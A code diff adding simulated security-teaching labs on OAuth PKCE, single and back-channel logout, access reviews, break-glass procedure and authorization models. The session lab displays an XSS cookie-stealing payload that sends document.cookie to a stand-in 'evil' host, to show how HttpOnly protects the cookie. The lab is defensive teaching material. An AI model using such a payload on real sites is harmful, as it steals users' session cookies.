@@ -3622,3 +3622,1141 @@ AcadLabs.register('lab-copilot', {
     log.add('info', 'Secure copilot ready: authorize the read, then govern the act. It acts only with your identity, never its own.');
   }
 });
+
+/* lab-birth | lesson: t7-birth */
+AcadLabs.register('lab-birth', {
+  title: 'Mint a token — if you can',
+  blurb: 'Generate a real PKCE pair, ride the authorization-code flow, then try to redeem the code with the wrong verifier, a replay, and a thief’s empty hands.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    var verifier = null, challenge = null, code = null, stateVal = null, consumed = false;
+
+    var pkce = h.stage(h.note('Step 1: generate a PKCE pair. The verifier stays server-side; only its S256 hash goes up front.'));
+    var out = h.stage(h.note('The token endpoint’s answers land here.'));
+
+    function show(node) { out.innerHTML = ''; out.appendChild(node); h.flash(out); }
+
+    function s256(str) {
+      return crypto.subtle.digest('SHA-256', new TextEncoder().encode(str)).then(function (buf) {
+        var bytes = new Uint8Array(buf), bin = '';
+        for (var i = 0; i < bytes.length; i++) { bin += String.fromCharCode(bytes[i]); }
+        return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+      });
+    }
+
+    function genPkce() {
+      verifier = h.rand(48); code = null; consumed = false;
+      log.add('info', 'Generating PKCE pair (real SHA-256 in your browser)…');
+      s256(verifier).then(function (ch) {
+        challenge = ch;
+        pkce.innerHTML = '';
+        pkce.appendChild(h.jsonView({ code_verifier: verifier, code_challenge: challenge, code_challenge_method: 'S256' }));
+        pkce.appendChild(h.note('The challenge is SHA-256(verifier), base64url. It goes up front; the verifier never leaves the backend.'));
+        log.add('ok', 'PKCE pair ready — challenge = S256(verifier). Now authorize.');
+      });
+    }
+
+    function authorize() {
+      if (!challenge) { log.add('warn', 'Generate a PKCE pair first.'); return; }
+      code = 'code_' + h.rand(12); stateVal = 'st_' + h.rand(8); consumed = false;
+      show(h.httpCard({
+        method: 'GET', path: '/authorize?response_type=code&code_challenge=' + challenge.slice(0, 10) + '…&state=' + stateVal,
+        status: 302, statusText: 'Found',
+        resBody: { Location: 'https://app.example/cb?code=' + code + '&state=' + stateVal },
+        note: 'One-time code delivered on the (visible) front channel to the exact registered redirect_uri. Anyone watching the redirect can copy it.'
+      }));
+      log.add('ok', 'Authorization server issued a one-time code + state on the front channel.');
+    }
+
+    function exchange(mode) {
+      if (!code) { log.add('warn', 'Press "Authorize" to obtain a code first.'); return; }
+      if (mode === 'replay' && !consumed) { log.add('warn', 'Nothing to replay yet — do a successful exchange first, then replay the spent code.'); return; }
+      if (consumed && mode !== 'thief') {
+        show(h.httpCard({ method: 'POST', path: '/token', reqBody: { grant_type: 'authorization_code', code: code, code_verifier: '…' },
+          status: 400, resBody: { error: 'invalid_grant', error_description: 'authorization code already redeemed — codes are single-use' },
+          note: 'A code is a one-time claim ticket. Once redeemed, every later presentation is refused.' }));
+        log.add('bad', 'Replay of a spent code → 400 invalid_grant (single-use).');
+        return;
+      }
+      if (mode === 'thief') {
+        show(h.httpCard({ method: 'POST', path: '/token', reqBody: { grant_type: 'authorization_code', code: code, code_verifier: null },
+          status: 400, resBody: { error: 'invalid_grant', error_description: 'PKCE code_verifier required — S256 challenge unmatched' },
+          note: 'The thief has the code but never saw the verifier. Without it the token endpoint refuses — the stolen code is dead weight.' }));
+        log.add('bad', '🕵 Thief redeemed the stolen code with no verifier → 400 invalid_grant. Empty hands.');
+        return;
+      }
+      var v = mode === 'wrong' ? ('wrong_' + h.rand(12)) : verifier;
+      s256(v).then(function (ch) {
+        if (ch === challenge) {
+          consumed = true;
+          var at = h.fakeJwt({ sub: 'maya', scope: 'bookings:write', cnf: { jkt: h.rand(10) } });
+          var idt = h.fakeJwt({ sub: 'maya', nonce: 'n_' + h.rand(6), amr: ['pwd', 'mfa'] });
+          var rt = 'rt_' + h.rand(24);
+          show(h.el('div', {}, [
+            h.httpCard({ method: 'POST', path: '/token', reqBody: { grant_type: 'authorization_code', code: code, code_verifier: v.slice(0, 8) + '…' },
+              status: 200, resBody: { token_type: 'DPoP', access_token: '…', refresh_token: rt, id_token: '…' },
+              note: 'S256(verifier) matched the stored challenge — the tokens are born.' }),
+            h.panel('access_token', [h.tokenView(at)]),
+            h.panel('id_token', [h.tokenView(idt)])
+          ]));
+          log.add('ok', 'Correct verifier → 200. Access + refresh + id token minted for Maya.');
+        } else {
+          show(h.httpCard({ method: 'POST', path: '/token', reqBody: { grant_type: 'authorization_code', code: code, code_verifier: v.slice(0, 8) + '…' },
+            status: 400, resBody: { error: 'invalid_grant', error_description: 'S256(code_verifier) ≠ stored code_challenge' },
+            note: 'Wrong verifier hashes to the wrong challenge. Code stays unspent — the real backend can still redeem it.' }));
+          log.add('bad', 'Wrong verifier → 400 invalid_grant. The code is still redeemable by the legitimate holder.');
+        }
+      });
+    }
+
+    root.appendChild(h.row([
+      h.col([
+        h.panel('The flow', [
+          h.button('1 · Generate PKCE pair', 'primary', genPkce),
+          h.button('2 · Authorize (get code)', 'ghost', authorize)
+        ]),
+        h.panel('3 · Exchange the code', [
+          h.button('Correct verifier', 'primary', function () { exchange('correct'); }),
+          h.button('Wrong verifier', 'ghost', function () { exchange('wrong'); }),
+          h.button('Replay the same code', 'ghost', function () { exchange('replay'); }),
+          h.button('🕵 Thief steals the code', 'danger', function () { exchange('thief'); })
+        ])
+      ]),
+      h.col([h.panel('PKCE pair', [pkce]), h.panel('Token endpoint', [out])])
+    ]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    log.add('info', 'Front channel carries a code; the back channel + PKCE verifier mints the tokens. Start at step 1.');
+  }
+});
+
+/* lab-sessions | lesson: a10-sessions */
+AcadLabs.register('lab-sessions', {
+  title: 'The great sign-out',
+  blurb: 'Priya is signed into the IdP and two apps. Clear a cookie, do RP-initiated then back-channel logout, and learn why only one of them truly ends every session.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    var idp = true, a = true, b = true;
+    var flags = { httpOnly: true, secure: true, sameSite: true };
+
+    var board = h.el('div', {});
+    var out = h.stage(h.note('Visit an app or run a logout — the server’s response lands here.'));
+
+    function show(node) { out.innerHTML = ''; out.appendChild(node); h.flash(out); }
+    function sessBadge(alive) { return alive ? h.badge('● alive', 'ok') : h.badge('○ ended', 'bad'); }
+    function sessRow(name, life, alive) {
+      return h.panel(null, [h.row([h.el('b', {}, name), sessBadge(alive)]), h.note(life)]);
+    }
+    function renderBoard() {
+      board.innerHTML = '';
+      board.appendChild(sessRow('IdP session', 'SSO master · longest-lived', idp));
+      board.appendChild(sessRow('App A session', 'app cookie · sliding 30 min', a));
+      board.appendChild(sessRow('App B session', 'app cookie · sliding 30 min', b));
+    }
+
+    function clearA() {
+      if (!a) { log.add('warn', 'App A already has no local session.'); return; }
+      a = false; renderBoard();
+      log.add('warn', 'Cleared App A’s local cookie — but the IdP session is untouched. This is NOT logout.');
+      show(h.note('App A cookie deleted. Try "Visit App A" — watch SSO silently sign Priya back in.'));
+    }
+    function rpLogout() {
+      a = false; idp = false; renderBoard();
+      log.add('ok', 'RP-initiated logout — App A redirected Priya to the IdP end_session endpoint. IdP session ended.');
+      show(h.httpCard({ method: 'GET', path: '/end_session?id_token_hint=…&post_logout_redirect_uri=…',
+        status: 302, statusText: 'Found', note: 'IdP + App A ended. But App B never heard about it — its session is still alive.' }));
+    }
+    function backChannel() {
+      idp = false; a = false; b = false; renderBoard();
+      log.add('ok', 'Back-channel logout — signed logout_token POSTed server-to-server to every app. All sessions dead.');
+      show(h.el('div', {}, [
+        h.httpCard({ method: 'POST', path: 'https://app-a.example/backchannel-logout',
+          reqBody: { logout_token: h.fakeJwt({ sub: 'priya', sid: 'sess_' + h.rand(6), events: { 'http://schemas.openid.net/event/backchannel-logout': {} } }).slice(0, 24) + '…' },
+          status: 200, note: 'No browser needed — works even after Priya closed the tab.' }),
+        h.httpCard({ method: 'POST', path: 'https://app-b.example/backchannel-logout',
+          reqBody: { logout_token: '…' }, status: 200, note: 'Every relying party gets the signed kill-signal. This is the reliable path.' })
+      ]));
+    }
+    function visit(app) {
+      var alive = app === 'a' ? a : b;
+      var host = app === 'a' ? 'app-a.example' : 'app-b.example';
+      if (alive) {
+        show(h.httpCard({ method: 'GET', path: 'https://' + host + '/dashboard', status: 200,
+          note: 'Session cookie present — straight in, no login screen.' }));
+        log.add('info', 'Visited App ' + app.toUpperCase() + ' → 200 (session alive).');
+        return;
+      }
+      if (idp) {
+        if (app === 'a') { a = true; } else { b = true; } renderBoard();
+        show(h.httpCard({ method: 'GET', path: 'https://' + host + '/dashboard', status: 200,
+          note: 'No login screen! The IdP session vouched via SSO and minted a fresh app session. Clearing a cookie is not logout.' }));
+        log.add('warn', 'Visited App ' + app.toUpperCase() + ' → silently signed back in via SSO. IdP session was still alive.');
+        return;
+      }
+      show(h.httpCard({ method: 'GET', path: 'https://' + host + '/dashboard', status: 401,
+        resBody: { error: 'login_required' }, note: 'IdP session gone too — no silent SSO. Priya must authenticate again.' }));
+      log.add('ok', 'Visited App ' + app.toUpperCase() + ' → 401 login_required. Truly logged out.');
+    }
+    function xss() {
+      if (flags.httpOnly) {
+        show(h.panel('XSS cookie-theft attempt', [h.badge('✅ blocked', 'ok'),
+          h.jsonView({ script: 'fetch("//evil?c="+document.cookie)', stolen: '(session cookie not visible to JS)' }),
+          h.note('HttpOnly is on — document.cookie can’t read the session cookie, so the payload exfiltrates nothing.')]));
+        log.add('ok', 'XSS ran, but HttpOnly hid the session cookie. Nothing stolen.');
+      } else {
+        show(h.panel('XSS cookie-theft attempt', [h.badge('⛔ cookie stolen', 'bad'),
+          h.jsonView({ script: 'fetch("//evil?c="+document.cookie)', stolen: 'session=' + h.rand(16) }),
+          h.note('HttpOnly is OFF — JavaScript read the cookie and shipped it to the attacker.')]));
+        log.add('bad', 'HttpOnly off → XSS exfiltrated the session cookie. Turn it back on.');
+      }
+    }
+
+    renderBoard();
+    root.appendChild(h.row([
+      h.col([h.panel('Session board (Priya, signed in everywhere)', [board]), h.panel('Server response', [out])]),
+      h.col([
+        h.panel('Sign-out controls', [
+          h.button('Clear App A cookie', 'ghost', clearA),
+          h.button('RP-initiated logout', 'ghost', rpLogout),
+          h.button('Back-channel logout (kills all)', 'primary', backChannel),
+          h.note('Then probe with a visit:'),
+          h.row([h.button('Visit App A', 'ghost', function () { visit('a'); }), h.button('Visit App B', 'ghost', function () { visit('b'); })])
+        ]),
+        h.panel('Cookie armor', [
+          h.row([
+            h.chip('HttpOnly', true, function (on) { flags.httpOnly = on; }),
+            h.chip('Secure', true, function (on) { flags.secure = on; }),
+            h.chip('SameSite', true, function (on) { flags.sameSite = on; })
+          ]),
+          h.button('Run XSS cookie-theft attempt', 'danger', xss),
+          h.note('Toggle HttpOnly off, then run the attack — only then does the cookie leak.')
+        ])
+      ])
+    ]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    log.add('info', 'One login spawned three sessions. Your job: end them all. Start by clearing a single cookie and see what survives.');
+  }
+});
+
+/* lab-reviews | lesson: o6-reviews */
+AcadLabs.register('lab-reviews', {
+  title: 'The certification campaign',
+  blurb: 'You are the reviewer: certify eight entitlements Keep or Revoke, then reveal the ground truth — dormant admin is risk, killing an active grant is breakage.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    // Ground truth: 'revoke' rows should go; 'keep' rows are legitimately in use.
+    var rows = [
+      { who: 'Priya', ent: 'Finance admin', how: 'granted for the FY2023 close project', used: 412, truth: 'revoke', why: 'dormant admin — project ended, access never removed. Classic entitlement creep.' },
+      { who: 'Priya', ent: 'CRM · read', how: 'birthright (Sales role)', used: 3, truth: 'keep', why: 'active and part of her current job — legit.' },
+      { who: 'Sam (contractor)', ent: 'VPN + repo write', how: 'contract ended 60 days ago, account still enabled', used: 61, truth: 'revoke', why: 'leaver leftover — the person is gone, the access is not.' },
+      { who: 'svc-billing-sync', ent: 'DB read/write', how: 'service account, owner unknown', used: 1, truth: 'keep', why: 'actively running nightly, so keeping it was right — BUT it is ownerless. Assign an owner or it becomes an unwatched NHI.' },
+      { who: 'Priya', ent: 'Payroll export', how: 'left the Payroll team 8 months ago', used: 233, truth: 'revoke', why: 'mover creep — moved teams, kept the old grant.' },
+      { who: 'Priya', ent: 'Wiki · editor', how: 'birthright (all staff)', used: 5, truth: 'keep', why: 'low-risk baseline access she actually uses.' },
+      { who: 'Bot A (RPA)', ent: 'Invoice submit', how: 'runs the nightly billing job', used: 0, truth: 'keep', why: 'a working automation — revoking it breaks the pipeline.' },
+      { who: 'Zara', ent: 'Prod SSH · admin', how: 'granted for one 2024 incident', used: 356, truth: 'revoke', why: 'dormant standing admin — huge blast radius for a login used once, a year ago.' }
+    ];
+    var decisions = new Array(rows.length);
+    var submitted = false;
+    var meter = h.meter(0, 'info');
+    var rowEls = [];
+
+    function decide(i, choice) {
+      if (submitted) return;
+      decisions[i] = choice;
+      paintRow(i);
+      log.add(choice === 'revoke' ? 'warn' : 'info', 'Certified row ' + (i + 1) + ' (' + rows[i].who + ' · ' + rows[i].ent + ') → ' + choice.toUpperCase());
+    }
+
+    function paintRow(i) {
+      var box = rowEls[i].verdict;
+      box.innerHTML = '';
+      if (submitted) {
+        var d = decisions[i], t = rows[i].truth, ok = d === t;
+        var kind = ok ? 'ok' : 'bad';
+        var label;
+        if (ok) label = '✅ correct';
+        else if (d === 'revoke') label = '⛔ breakage — you revoked an active grant';
+        else label = '⚠️ risk — you kept a grant that should be gone';
+        box.appendChild(h.badge(label, kind));
+        box.appendChild(h.note((ok ? '' : 'Truth: ' + t.toUpperCase() + '. ') + rows[i].why));
+      } else if (decisions[i]) {
+        box.appendChild(h.badge(decisions[i] === 'revoke' ? '⛔ REVOKE' : '✓ KEEP', decisions[i] === 'revoke' ? 'warn' : 'ok'));
+      }
+    }
+
+    function buildRow(i) {
+      var r = rows[i];
+      var verdict = h.el('div', {});
+      rowEls[i] = { verdict: verdict };
+      var usedTxt = r.used === 0 ? 'last used: today (running)' : 'last used: ' + r.used + ' days ago';
+      return h.panel(null, [
+        h.el('div', { class: 'acad-lab-panel-title' }, r.who + ' · ' + r.ent),
+        h.note(r.how),
+        h.note(usedTxt + (r.used >= 200 ? '  ⚠️ dormant' : '')),
+        h.row([
+          h.button('✓ Keep', 'ghost', function () { decide(i, 'keep'); }),
+          h.button('⛔ Revoke', 'ghost', function () { decide(i, 'revoke'); })
+        ]),
+        verdict
+      ]);
+    }
+
+    function grade() {
+      var correct = 0, breakage = 0, missed = 0;
+      for (var i = 0; i < rows.length; i++) {
+        if (decisions[i] === rows[i].truth) correct++;
+        else if (decisions[i] === 'revoke') breakage++;
+        else missed++;
+      }
+      return { correct: correct, breakage: breakage, missed: missed };
+    }
+
+    function submit(rubber) {
+      if (submitted) return;
+      if (!rubber) {
+        for (var k = 0; k < rows.length; k++) {
+          if (!decisions[k]) { log.add('warn', 'Row ' + (k + 1) + ' is undecided — certify every row before submitting.'); h.flash(rowEls[k].verdict); return; }
+        }
+      }
+      submitted = true;
+      for (var i = 0; i < rows.length; i++) paintRow(i);
+      var g = grade();
+      var pct = Math.round(g.correct / rows.length * 100);
+      meter.set(pct, pct >= 75 ? 'ok' : (pct >= 50 ? 'warn' : 'bad'));
+      var summary = h.el('div', {});
+      summary.appendChild(h.badge('Score ' + g.correct + '/' + rows.length + ' · least-privilege ' + pct + '%', pct >= 75 ? 'ok' : 'bad'));
+      if (rubber) {
+        summary.appendChild(h.note('Rubber-stamp grade: you approved all ' + rows.length + ' rows in one click. ' + g.missed + ' dormant / leaver grants survived. This is exactly how entitlement creep wins — a clean review that certified nothing.'));
+        log.add('bad', 'RUBBER STAMP: approved all ' + rows.length + ' rows instantly — ' + g.missed + ' risky grants left live.');
+      } else {
+        summary.appendChild(h.note(g.breakage + ' active grant(s) wrongly revoked (business breakage), ' + g.missed + ' dormant grant(s) wrongly kept (standing risk). The trick: revoke on the usage data, keep only what is used.'));
+        log.add(pct >= 75 ? 'ok' : 'warn', 'Campaign submitted → ' + g.correct + '/' + rows.length + ' correct.');
+      }
+      out.innerHTML = '';
+      out.appendChild(summary);
+      h.flash(out);
+    }
+
+    var out = h.stage(h.note('Certify all eight rows, then Submit — or try the Rubber-stamp button and see what a lazy review costs.'));
+    var list = h.el('div', {});
+    for (var i = 0; i < rows.length; i++) list.appendChild(buildRow(i));
+
+    root.appendChild(h.row([
+      h.col([h.panel('Q3 access review · 8 entitlements', [list])]),
+      h.col([
+        h.panel('Campaign result', [meter.root, out]),
+        h.panel('Actions', [
+          h.button('Submit campaign', 'primary', function () { submit(false); }),
+          h.button('Rubber-stamp all ✓', 'danger', function () {
+            if (submitted) return;
+            for (var j = 0; j < rows.length; j++) { decisions[j] = 'keep'; paintRow(j); }
+            submit(true);
+          })
+        ])
+      ])
+    ]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    log.add('info', 'Reviewer seat: keep only what is actually used. "Last used 340 days ago" is your best friend.');
+  }
+});
+
+/* lab-breakglass | lesson: o7-breakglass */
+AcadLabs.register('lab-breakglass', {
+  title: 'Break the glass — correctly',
+  blurb: 'IdP outage at 2 a.m. Click the emergency steps in the right order; a live session countdown punishes fixing too slowly and skipping the reseal.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    // Canonical order: dual control gates the unseal, session is time-boxed, reseal ends it.
+    var ORDER = ['approver', 'unseal', 'session', 'fix', 'rotate', 'review'];
+    var LABEL = {
+      approver: 'Get second approver (dual control)',
+      unseal: 'Unseal the break-glass credential',
+      session: 'Start time-boxed session',
+      fix: 'Fix the IdP',
+      rotate: 'Rotate the credential',
+      review: 'Post-incident review'
+    };
+    var TOO_EARLY = {
+      approver: '⛔ Already approved — dual control is in place.',
+      unseal: '⛔ Break-glass is dual-controlled. You need a second approver before the safe opens — get one first.',
+      session: '⛔ No credential in hand — unseal the sealed break-glass account before you can open a session.',
+      fix: '⛔ The admin console is unreachable and you have no privileged session. You never got into break-glass — fixing the IdP needs the access you have not obtained yet.',
+      rotate: '⚠️ Rotating now, mid-outage, burns the credential before service is back and locks you out again. Resolve the IdP first.',
+      review: '⚠️ Reviewing before you rotate leaves a live secret outside the safe and the alarm still ringing. Rotate first.'
+    };
+    var pos = 0, wrong = 0, expired = 0, sessionTimer = null, secsLeft = 0;
+    var SESSION_SECS = 12;
+
+    var meter = h.meter(0, 'info');
+    var meterLabel = h.note('Time-boxed session: not open.');
+    var progWrap = h.el('div', {});
+    var out = h.stage(h.note('The IdP is down and the admin console is behind it. Work the emergency in the right order.'));
+
+    function renderProgress() {
+      progWrap.innerHTML = '';
+      ORDER.forEach(function (id, i) {
+        progWrap.appendChild(h.badge((i < pos ? '✓ ' : (i === pos ? '→ ' : '')) + LABEL[id], i < pos ? 'ok' : (i === pos ? 'info' : 'neutral')));
+      });
+    }
+
+    function stopSession() {
+      if (sessionTimer) { clearInterval(sessionTimer); sessionTimer = null; }
+      secsLeft = 0; meter.set(0, 'info'); meterLabel.textContent = 'Time-boxed session: not open.';
+    }
+
+    function startSession() {
+      secsLeft = SESSION_SECS;
+      meter.set(100, 'ok'); meterLabel.textContent = 'Time-boxed session: ' + secsLeft + 's left — fix the IdP before it expires.';
+      sessionTimer = h.interval(function () {
+        secsLeft--;
+        var pct = Math.max(0, secsLeft / SESSION_SECS * 100);
+        meter.set(pct, pct > 40 ? 'ok' : 'warn');
+        meterLabel.textContent = 'Time-boxed session: ' + secsLeft + 's left.';
+        if (secsLeft <= 0) {
+          clearInterval(sessionTimer); sessionTimer = null;
+          expired++;
+          meter.set(0, 'bad'); meterLabel.textContent = 'Time-boxed session EXPIRED — access auto-revoked.';
+          log.add('bad', '⏱️ Session expired before the IdP was fixed — access auto-revoked. Re-approve and open a fresh session.');
+          // Roll back to needing a fresh (re-approved) session.
+          pos = ORDER.indexOf('session');
+          renderProgress();
+        }
+      }, 1000);
+    }
+
+    function finish() {
+      stopSession();
+      var clean = wrong === 0 && expired === 0;
+      var grade = clean ? '🏆 Clean break-glass' : (wrong + expired <= 2 ? 'Passable — with scars' : 'Messy — review the fumbles');
+      out.innerHTML = '';
+      out.appendChild(h.badge(grade + ' · ' + wrong + ' wrong-order, ' + expired + ' expiry', clean ? 'ok' : 'warn'));
+      out.appendChild(h.note('Glass whole again: sealed with a fresh secret, the log read back, the story filed. Press Reset to run it again.'));
+      log.add(clean ? 'ok' : 'warn', 'Incident closed. ' + grade + '.');
+      h.flash(out);
+    }
+
+    function doStep(id) {
+      if (pos >= ORDER.length) { log.add('info', 'Incident already closed — press Reset to replay.'); return; }
+      var expected = ORDER[pos];
+      if (id !== expected) {
+        wrong++;
+        log.add(TOO_EARLY[id].charAt(0) === '⛔' ? 'bad' : 'warn', TOO_EARLY[id]);
+        out.innerHTML = ''; out.appendChild(h.note(TOO_EARLY[id])); h.flash(out);
+        return;
+      }
+      // Correct step.
+      pos++;
+      if (id === 'approver') log.add('ok', 'Second approver secured — four eyes, not one.');
+      else if (id === 'unseal') log.add('warn', 'Break-glass unsealed — and the alarm fired, exactly as designed. Every use is a red flag.');
+      else if (id === 'session') { log.add('ok', 'Time-boxed session open — everything recorded. Clock is running.'); startSession(); }
+      else if (id === 'fix') { stopSession(); log.add('ok', 'IdP restored with time to spare. Session can close cleanly.'); }
+      else if (id === 'rotate') log.add('ok', 'Credential rotated — the exposed secret is burned, alarm clears.');
+      renderProgress();
+      out.innerHTML = ''; out.appendChild(h.badge('✅ ' + LABEL[id], 'ok')); h.flash(out);
+      if (id === 'review') { renderProgress(); finish(); }
+    }
+
+    var pool = h.panel('Emergency actions (click in the right order)', ORDER.map(function (id) {
+      return h.button(LABEL[id], 'ghost', function () { doStep(id); });
+    }));
+
+    root.appendChild(h.row([
+      h.col([pool, h.panel('Sequence progress', [progWrap])]),
+      h.col([
+        h.panel('Session clock', [meter.root, meterLabel]),
+        h.panel('Latest step', out)
+      ])
+    ]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    renderProgress();
+    log.add('info', '2 a.m.: IdP outage. Break-glass is the only way in — use it correctly, then reseal it.');
+  }
+});
+
+/* lab-models | lesson: az1-models */
+AcadLabs.register('lab-models', {
+  title: 'Three locks, one door',
+  blurb: 'Five access requests land on your desk — pick RBAC, ABAC or ReBAC for each, and watch the "roles created" counter spiral every time you force RBAC to handle sharing.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    var deck = [
+      { q: 'Sam needs to comment on ONE doc', best: 'rebac', sharing: true,
+        why: 'One person, one resource — that is a relationship (share), not a job. RBAC would mint a throwaway role.' },
+      { q: 'Auditors need read-everything during the Q4 audit', best: 'abac', sharing: false,
+        why: 'The grant is bounded by a live condition (time window) — an attribute rule fits, and expires on its own.' },
+      { q: 'A new intern joins finance', best: 'rbac', sharing: false,
+        why: 'Coarse, stable, job-shaped access — the textbook case for a role. Give them the finance role, done.' },
+      { q: 'Maya shares a doc with Sam', best: 'rebac', sharing: true,
+        why: 'The classic docs-app share button, modeled: one relationship edge (owner shares viewer). No role, no rule.' },
+      { q: 'Revoke a contractor everywhere', best: 'abac', sharing: false,
+        why: 'Flip one attribute (employed = false) and every rule denies at once — no hunting down scattered role grants.' }
+    ];
+    var LABEL = { rbac: 'RBAC', abac: 'ABAC', rebac: 'ReBAC' };
+    var i = 0, roles = 0;
+    var tally = { rbac: 0, abac: 0, rebac: 0 };
+
+    var qBox = h.el('div', {});
+    var fb = h.el('div', {});
+    var tallyBox = h.el('div', { class: 'acad-lab-row' });
+    var rolesMeter = h.meter(0, 'warn');
+    var rolesNote = h.note('Roles created so far: 0');
+
+    function renderTally() {
+      tallyBox.innerHTML = '';
+      tallyBox.appendChild(h.badge('RBAC wins · ' + tally.rbac, 'info'));
+      tallyBox.appendChild(h.badge('ABAC wins · ' + tally.abac, 'info'));
+      tallyBox.appendChild(h.badge('ReBAC wins · ' + tally.rebac, 'info'));
+    }
+
+    function bumpRoles(reason) {
+      roles += 1;
+      rolesMeter.set(Math.min(100, roles * 20), 'bad');
+      rolesNote.textContent = 'Roles created so far: ' + roles + '  (e.g. commenter_partner_report4411)';
+      h.flash(rolesNote);
+      log.add('bad', 'RBAC forced onto a sharing case → new bespoke role minted. Role explosion +1. ' + reason);
+    }
+
+    function choose(pick) {
+      var s = deck[i];
+      var right = pick === s.best;
+      if (s.sharing && pick === 'rbac') bumpRoles('"' + s.q + '"');
+      if (right) tally[s.best] += 1;
+      renderTally();
+      fb.innerHTML = '';
+      fb.appendChild(h.badge(right ? '✅ Natural fit' : '⚠️ Works, but fights you', right ? 'ok' : 'warn'));
+      fb.appendChild(h.note((right ? '' : 'Best fit is ' + LABEL[s.best] + '. ') + s.why));
+      log.add(right ? 'ok' : 'warn', '"' + s.q + '" → you chose ' + LABEL[pick] + (right ? ' ✓' : ' (best: ' + LABEL[s.best] + ')'));
+      i += 1;
+      if (i < deck.length) { h.timeout(renderQ, 150); }
+      else { h.timeout(verdict, 150); }
+    }
+
+    function renderQ() {
+      var s = deck[i];
+      qBox.innerHTML = '';
+      qBox.appendChild(h.el('div', { class: 'acad-lab-panel-title' }, 'Request ' + (i + 1) + ' of ' + deck.length));
+      qBox.appendChild(h.note('“' + s.q + '” — which model handles it most naturally?'));
+      qBox.appendChild(h.row([
+        h.button('RBAC', 'ghost', function () { choose('rbac'); }),
+        h.button('ABAC', 'ghost', function () { choose('abac'); }),
+        h.button('ReBAC', 'ghost', function () { choose('rebac'); })
+      ]));
+    }
+
+    function verdict() {
+      qBox.innerHTML = '';
+      qBox.appendChild(h.badge('Deck complete', 'ok'));
+      qBox.appendChild(h.note('RBAC for the org chart, ABAC for the guardrails, ReBAC for the sharing — real systems blend all three. You minted ' + roles + ' bespoke role(s) along the way; every one is a future audit headache.'));
+      fb.innerHTML = '';
+      log.add('info', 'Verdict: no single model wins. Match each request to its natural shape and lean on all three.');
+    }
+
+    root.appendChild(h.row([
+      h.col([h.panel('The request queue', [qBox, fb])]),
+      h.col([
+        h.panel('Scoreboard', [tallyBox]),
+        h.panel('Role-explosion meter', [rolesMeter.root, rolesNote])
+      ])
+    ]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    renderTally();
+    renderQ();
+    log.add('info', 'Same door, three locks. Pick the lock that fits — or watch RBAC breed roles.');
+  }
+});
+
+/* lab-rebac | lesson: az2-rebac */
+AcadLabs.register('lab-rebac', {
+  title: 'Fewest tuples wins',
+  blurb: 'Author relationship tuples until four required checks all pass — Sam must stay OUT — and beat par of 3 tuples.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    var PAR = 3;
+    // Fixed model facts (given, not editable): folder:q3 is parent of doc:report.
+    var FIXED = [{ s: 'folder:q3', r: 'parent', o: 'doc:report' }];
+    var IMPLIES = { viewer: ['viewer', 'editor', 'owner'], editor: ['editor', 'owner'], owner: ['owner'], parent: ['parent'] };
+    var tuples = [];
+
+    // Bounded graph walk over FIXED+authored tuples. owner⇒editor⇒viewer; folder viewer/editor inherits to child doc.
+    function check(subject, rel, obj, depth) {
+      if (depth > 8) return false;
+      var all = FIXED.concat(tuples);
+      var accept = IMPLIES[rel] || [rel];
+      for (var i = 0; i < all.length; i++) {
+        var t = all[i];
+        if (t.o === obj && t.s === subject && accept.indexOf(t.r) > -1) return true;
+      }
+      if (rel === 'viewer' || rel === 'editor') {
+        for (var j = 0; j < all.length; j++) {
+          if (all[j].r === 'parent' && all[j].o === obj) {
+            if (check(subject, rel, all[j].s, depth + 1)) return true;
+          }
+        }
+      }
+      return false;
+    }
+
+    var CHECKS = [
+      { label: 'Priya can EDIT doc:report', s: 'user:priya', r: 'editor', o: 'doc:report', want: true },
+      { label: 'Maya can VIEW doc:report', s: 'user:maya', r: 'viewer', o: 'doc:report', want: true },
+      { label: 'Sam can NOT view doc:report', s: 'user:sam', r: 'viewer', o: 'doc:report', want: false },
+      { label: 'Finance team views folder:q3', s: 'group:finance#member', r: 'viewer', o: 'folder:q3', want: true }
+    ];
+
+    var listBox = h.el('div', { class: 'acad-lab-col' });
+    var resultBox = h.el('div', {});
+
+    function renderList() {
+      listBox.innerHTML = '';
+      if (!tuples.length) { listBox.appendChild(h.note('No tuples yet — every check will fail.')); return; }
+      tuples.forEach(function (t, idx) {
+        listBox.appendChild(h.row([
+          h.badge('(' + t.s + ', ' + t.r + ', ' + t.o + ')', 'info'),
+          h.button('✕', 'ghost', function () {
+            tuples.splice(idx, 1); renderList();
+            log.add('warn', 'DELETE (' + t.s + ', ' + t.r + ', ' + t.o + ')');
+          })
+        ]));
+      });
+    }
+
+    var subj = h.select([
+      { value: 'user:priya', label: 'user:priya' }, { value: 'user:maya', label: 'user:maya' },
+      { value: 'user:sam', label: 'user:sam' }, { value: 'group:finance#member', label: 'group:finance#member' }
+    ]);
+    var rel = h.select(['viewer', 'editor', 'owner'].map(function (r) { return { value: r, label: r }; }));
+    var obj = h.select([{ value: 'doc:report', label: 'doc:report' }, { value: 'folder:q3', label: 'folder:q3' }]);
+
+    function addTuple() {
+      var s = subj.value, r = rel.value, o = obj.value;
+      if (tuples.some(function (t) { return t.s === s && t.r === r && t.o === o; })) {
+        log.add('info', 'Already stored — writes are idempotent.'); return;
+      }
+      tuples.push({ s: s, r: r, o: o }); renderList(); h.flash(listBox);
+      log.add('ok', 'WRITE (' + s + ', ' + r + ', ' + o + ')');
+    }
+
+    function runChecks() {
+      resultBox.innerHTML = '';
+      var passAll = true;
+      CHECKS.forEach(function (c) {
+        var got = check(c.s, c.r, c.o, 0);
+        var ok = got === c.want;
+        if (!ok) passAll = false;
+        resultBox.appendChild(h.row([
+          h.badge(ok ? '✓' : '✕', ok ? 'ok' : 'bad'),
+          h.note(c.label + ' — expected ' + (c.want ? 'ALLOW' : 'DENY') + ', got ' + (got ? 'ALLOW' : 'DENY'))
+        ]));
+      });
+      if (passAll && tuples.length <= PAR) {
